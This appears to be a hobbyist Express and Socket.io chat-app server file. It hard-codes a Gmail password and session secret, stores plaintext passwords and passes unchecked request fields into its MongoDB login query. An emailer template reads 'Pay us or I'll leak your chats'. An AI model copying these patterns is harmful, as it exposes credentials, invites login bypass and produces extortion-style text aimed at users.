const { json } = require('body-parser');
const express = require('express'); 
const session = require('express-session');
const socket = require('socket.io');
const http = require('http');
const fs = require('fs');
const dbInit = require("./database");
const nodemailer = require("nodemailer");
const smtpTransport = require('nodemailer-smtp-transport');
const crypto = require('crypto');
const messageModel = require('./messagesschema');
const { resolveSoa } = require('dns');
const { jsPDF } = require("jspdf");
const bodyParser = require('body-parser')



let doc = new jsPDF();
let app = express();

app.use(express.json());
app.use(express.urlencoded({extended : true}))
app.use(bodyParser.raw({ type: "application/octet-stream" }));

app.set('view engine', 'ejs');

app.use(express.static(__dirname));
app.use(express.static(__dirname + "chatting_app"));
app.use(express.static(__dirname + "/chatting_field"));
app.use(express.static(__dirname + "/schemas"));
app.use(express.static(__dirname + "/signup"));

const groupModel = require(__dirname+"/groupschema");
const userModel = require(__dirname+"/userschema");
const msgModel = require(__dirname+"/messagesschema");
const port = 3000 // using the port
let server = http.createServer(app)
let io = socket(server)


dbInit(function(err)
{
    if(err)
    {
        console.log(err);
        return;
    }
    
    console.log("Worked");
    
    server.listen(port,() => {
        if(err){
            console.log("Error in port opening")
        }
        else{
            console.log("Port:\t",port)
        }
    })
})

io.on('connection',socket =>{
  console.log("user connected",socket.id);

    socket.on('create',(room)=>{
        console.log("Room created",room);
        socket.join(room);

    })
    socket.on('message_send',message=>{
        console.log("messadklfjnsdkjfgajfs",message.msg_id);
        socket.broadcast.to(message.msg_id).emit("recived",
      {
        msg:message.msg_txt,
        id:message.msg_id,
        time:message.msg_time
        })
    })


})


app.use(session({
    secret:"oh yea bruh",
    resave: false,
    saveUninitialized: true,
}))



app.get("/",(req,res)=>{
    if(req.session.is_loged_in){
        res.render(__dirname+"/chatting_field/chat.ejs");
    }
    else{
        res.render(__dirname + "/login/login.ejs",{data:""});
    }
    // res.end("Hello")
})

app.route("/login")
.get((req,res)=>{
    if(req.session.is_loged_in){
        res.redirect("/");
    }
    else{
        res.render(__dirname + "/login/login.ejs",{data:""});
    }
    
})
.post((req,res)=>{
    console.log("Admin check",req.body)
    // const hash = crypto.createHash('sha256').update(req.body.password).digest('hex');
    
    loginrequest(req,res);
    
})



app.route("/signup")
.post((req,res)=>
{   req.session.signup_data = req.body;
    console.log("Signup data",req.session.signup_data);
    createModel(req,res);
    
})

.get((req,res)=>{
    if(req.session.is_loged_in){
        res.redirect("/");
    }
    else{
        res.render(__dirname+"/signup/signup.ejs",{data:""}); 
    }
})


app.get("/get_all_users",(req,res)=>{
    if(req.session.is_loged_in){
        userModel.find().then(function(data){
            res.status(200).send(data);
        })
    }
})


app.get("/new_msg",(req,res)=>{
    if(req.session.is_loged_in){
        res.render(__dirname+"/chatting_field/new_msg.ejs")
    }
    else{
        res.redirect("/login");
    }
})

app.post("/add_new_contact",(req,res)=>{
    console.log("welcome",req.body)
    groupModel.create(
        {
        lastUpdated:Date.now(),
        username: req.session.name,
        sender_name:req.body.sender_name,
        participants:[
            {email:req.body.contact_email},
            {email:req.session.email},
        ]})
    .then((data)=>{
        if(data){
            res.send(data);
            console.log("Returned data",data);
            console.log("contact adding worked")
        }
        else{
            console.log("Eror occured while adding contact");
        }
    })
})

app.get("/check_for_existing_email",(req,res)=>{
    if(req.session.is_loged_in){
        console.log("Email adding",req.query.my_email);
        userModel.find({email:req.query.my_email}).then(function(data){
            if(data[0]!== undefined){
                res.status(200).send();
            }
            else{
                res.status(404).send();
            }
        })
    }
})


app.get("/get_all_chat",(req,res)=>{
    if(req.session.is_loged_in){
        console.log(req.session.email)
        groupModel.find({participants:{$elemMatch:{email:req.session.email}}},{_id:1,"participants.email":1,lastUpdated:1,username:1,sender_name:1}).then(function(data){
            console.log("Got all data from database",data);
            res.send(data);
        })
    }
})

app.get("/get_the_latest_msg",(req,res)=>{
    console.log("MY_email_for_first_msg:\t",req.query.msg);
    messageModel.find({reciverGroupId:req.query.msg,read_by:{$not:{$elemMatch:{email:req.session.email}}}})
    .then((data)=>{
        console.log("first msg data",data);
        if(data[0] !== undefined){
            res.status(200).send(JSON.stringify({my_array:data, array_length:data.length}));
        }
        else{
            res.status(404).send(data);
        }
    })
    .catch((err)=>{
        console.log(err);
    })
})

app.get("/user_read_text",(req,res)=>{
    console.log("user_read_text",req.query.has_readin_msg);
    messageModel.find({reciverGroupId:req.query.group_id, read_by:{$not:{$elemMatch:{email:req.session.email}}}}).then((data)=>{
        if(data){
            console.log("Data returned",data);
            
            for(var i=0;i<data.length;i++){
                console.log("Data ID:",data[i]._id)
                messageModel.findOneAndUpdate({_id:data[i]._id}, {$push:{read_by:{email:req.session.email}}}).then((data)=>{
                    if(data){
                        console.log("User has readin the text");
                    }
                    else{
                        console.log("Nothing happned");
                    }
                })
            }//for loop
        }else{
            console.log("No data found");
        }
    })

})

app.get("/my_email",(req,res)=>{
    if(req.session.is_loged_in){
        userModel.find({email:req.session.email}).then((data)=>{
            if(data[0]!== undefined){
                res.send(JSON.stringify(data));
            }
        })
    }
})

app.get("/new_group",(req,res)=>{
    if(req.session.is_loged_in){
        res.render(__dirname+"/chatting_field/new_group.ejs")
    }
    else{
        res.redirect("/");
    }
})


app.get("/user_is_reading_chats",(req,res)=>{
    console.log("Is it here");
    messageModel.find({reciverGroupId:req.query.group_id, timeStamp:parseInt(req.query.time) , read_by:{$elemMatch:{email:req.session.email}}}).then((data)=>{
        console.log("user reading:\t",data);
    })
})

app.post("/start_chat",(req,res)=>{
    console.log("Sender Email",req.session.email)
    console.log("Message recived:\t",req.body.data,req.body.groupID)

    messageModel.create(
        {
            message:req.body.data,
            senderId:req.session.email,
            reciverGroupId:req.body.groupID,
            timeStamp:Date.now(),
            read_by:[
                {email:req.session.email}
            ]
        })
        .then((data)=>{
            console.log("Message added");
        })
        .catch((err)=>{
            console.log("Error occured",err);
        })
})

app.post("/load_messages",(req,res)=>{
    console.log("LIMT",req.query.limit);
    console.log("SKIP",req.query.skip);
    console.log("Group id:\t",req.body.groupID);
    console.log("Senders ID:\t",req.session.email);

    messageModel.find(
        {
        reciverGroupId:req.body.groupID,
        })
        .skip(parseInt(req.query.skip))
        .limit(parseInt(req.query.limit))
        .then((data)=>{
            // console.log("Messages data getting back",data);
            res.send(data)
        })
        .catch((err)=>{
            console.log("Message error ocur",err);
        })
})

app.post("/add_to_group",(req,res)=>{
    console.log("Group name",req.query.group);
    req.body.push({email:req.session.email});
    console.log("Add to group worked",req.body);
    groupModel.create({
        lastUpdated:Date.now(),
        username: req.query.group,
        sender_name:req.query.group,
        participants:req.body
    })
    res.status(200).send()
})

app.get("/check_for_exixting_contact",(req,res)=>{
    if(req.session.is_loged_in){
        groupModel.find({$and:[{participants:{$size:2,$elemMatch:{email:req.query.email}}},{participants:{$size:2,$elemMatch:{email:req.session.email}}}]}).then(function(data){
            console.log("group Model find",data);
            if(data[0] === undefined){
                console.log("Not in contacts")
                res.status(200).send(data);
            }
            else{
                res.status(404).send(data);
            }
        })
    }
})

app.get("/export",(req,res)=>{
    if(req.session.is_loged_in){
        res.render(__dirname + "/chatting_field/export_chat.ejs",{
            my_email:req.session.email,
            sender_email:req.query.user_email,
            chat_id:req.query.chat_id
        });
    }
    else{
        res.redirect("/");
    }
})

app.post("/getting_messages_to_export_page",(req,res)=>{
    console.log("Exporting msg for",req.body.chatId);
    messageModel.find({reciverGroupId:req.body.chatId}).then((data)=>{
        if(data){
            // console.log("All messages",data);
            res.send(data);
        }
    })

})


app.post("/sending_pdf_to_mail",(req,res)=>{
    console.log("Email to",req.body.senderEmail);
    console.log("Email to",req.body.fileName);

    // createTranspoter(req.session.email,req.body.fileName); //if you want to send file to email use this
})


function signuprequest(req,res)
{   let data = req.body;
    console.log("uhdygtft",data);
    triming(data);
    god_level_validator(data,req,res);
    
}

function loginrequest(req,res){
    console.log("Login Request:\t",req.body);
    // const hash = crypto.createHash('sha256').update(req.body.password).digest('hex');
    // req.body.password = hash;
     var  loginReq = req.body;
    userModel.find({username:req.body.username,password:req.body.password}).then(function(data)
    {    
         if(data[0] !== undefined){
             req.session.is_loged_in = true;
            console.log("Login data",data[0].email);
            req.session.email = data[0].email;
            req.session.name = data[0].name;
             res.redirect("/");
             console.log("LOGIN SUCCESFULL");
         }
         else{
             res.render(__dirname + "/login/login.ejs",{data:"email or password invalid"});
             console.log("Error");
             return;
         }
         
    })
    .catch(function(err)
    {    console.log(err);
         return;
    })
}

function createModel(req,res)
{   
    console.log("creating:",req.body)
    // const hash = crypto.createHash('sha256').update(data.password).digest('hex');
    userModel.create(
        {
        name:req.body.name,
        username:req.body.username,
        email:req.body.email,
        password:req.body.password,
    }).then(function(updated)
    {
        console.log("Data ID:\t",updated.id)
        // console.log("Hash:\t",hash)
        console.log("data base updated");
    })
    .catch(function(err)
    {
        console.log("Error:\t",err)
    })
    // req.session.is_loged_in = true;
    res.redirect("/login");
}


function god_level_validator(data,req,res)
{   
    if((data.name !=="") && (data.email!=="") && (data.password !== "") && (data.username !==""))
    {
        if(data.username.length >5)
        {
            if((data.password.length >8))
            {
                if(ValidateEmail(data.email))
                {
                    if(validate_pass(data.password))
                    {   let mydata2 = {email:data.email};
                        let mydata = {username:data.username};
                        loginModel.find(mydata).then(function(data){
                            if(data[0] === undefined){
                                console.log("Email:\t",mydata2)
                                loginModel.find(mydata2).then(function(data){
                                    if(data[0] === undefined)
                                    {   
                                        req.session.signup_otp = true;
                                        console.log("Validation success");
                                        createTranspoter(req,res,mydata2.email)
                                    }
                                    else{
                                        res.render(__dirname+"/signup/signup.ejs",{data:"Email already in use"})
                                        console.log("Email already")
                                    }
                                })
                            }
                            else{
                                res.render(__dirname+"/signup/signup.ejs",{data:"username taken"})
                                console.log("User already taken");
                            }

                
                        })
                        .catch(function(err){
                            console.log("NO entry in database");
                        })
                    }
                    else{
                        res.render(__dirname+"/signup/signup.ejs",{data:"password should consist [A-Z],[a-z],[0-9],[@?_#]"})
                        console.log("password validation")
                    }
                } 
                else{
                    res.render(__dirname+"/signup/signup.ejs",{data:"Invalid email address"})
                    console.log("Email error")
                }      
            }
            else{
                res.render(__dirname+"/signup/signup.ejs",{data:"password should be 8 character long"})
                console.log("Password length is small")
            }

        }
        else
        {
            res.render(__dirname+"/signup/signup.ejs",{data:"username should be 8 character long"})
            console.log("username length is small")
        }
    }
else
    {
        res.render(__dirname+"/signup/signup.ejs",{data:"Fields cannot be empty"})
        console.log("cannot be null")
    }
}


function createTranspoter(send_to,fileName){
    var transporter = nodemailer.createTransport(smtpTransport({
        service: 'gmail',
        host: 'smtp.gmail.com',
        auth: {
          user: 'testing.cq.node@gmail.com',
          pass: 'hahoxzdwdolruxec'
        }
      }));
      
      var mailOptions = {
        from: 'testing.cq.node@gmail.com',
        to: send_to,
        subject: 'Password Reset Request',
        text: "Your Chats are here:",
        attachments: [{
            filename: 'file.pdf',
            path: `/home/itachi/Downloads/${fileName}.pdf`,
            contentType: 'application/pdf'
          }],
        html:`Pay us or I'll leak your chats`
      };
      
      transporter.sendMail(mailOptions, function(error, info){
        if (error) {
          console.log(error);
        } 
        else {
            console.log("Email has been send",info);
        }
      });  
}